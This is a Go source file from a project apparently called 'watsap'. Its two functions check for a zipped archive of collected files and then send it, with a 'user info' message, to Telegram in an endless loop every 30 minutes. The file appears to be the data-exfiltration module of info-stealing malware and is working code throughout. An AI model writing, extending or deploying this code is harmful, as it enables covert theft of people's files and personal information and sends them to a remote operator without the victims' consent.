package files

import (
	"time"
	"watsap/utils/config"
	"watsap/utils/files"
	"watsap/utils/messages"
	"watsap/utils/telegram"
)

var zipFile = config.WaDir + "/files.zip"

func SendFiles() {
	config.Logger("SendFiles started", "debug")
	for {
		err := telegram.TgSendFile(zipFile, messages.GetUserInfoMsg())
		if err != nil {
			config.Logger("[Files] Error sending file: "+err.Error(), "error")
		} else {
			config.Logger("[Files] File Sent", "info")
		}
		if config.DebugMode {
			config.Logger("DebugMode is ON, sleeping for 5 seconds", "debug")
			time.Sleep(5 * time.Second)
		} else {
			if config.FirstRun {
				config.Logger("FirstRun is true, sleeping for 1 second", "debug")
				time.Sleep(1 * time.Second)
			} else {
				config.Logger("Sleeping for 30 minutes", "debug")
				time.Sleep(30 * time.Minute)
			}
		}
	}
}

func CheckAndSendFiles() {
	config.Logger("CheckAndSendFiles called", "debug")
	if files.Exists(zipFile) {
		config.Logger("zipFile exists, sending files", "debug")
		SendFiles()
	} else {
		config.Logger("[Files] File not found: "+zipFile, "error")
	}
}
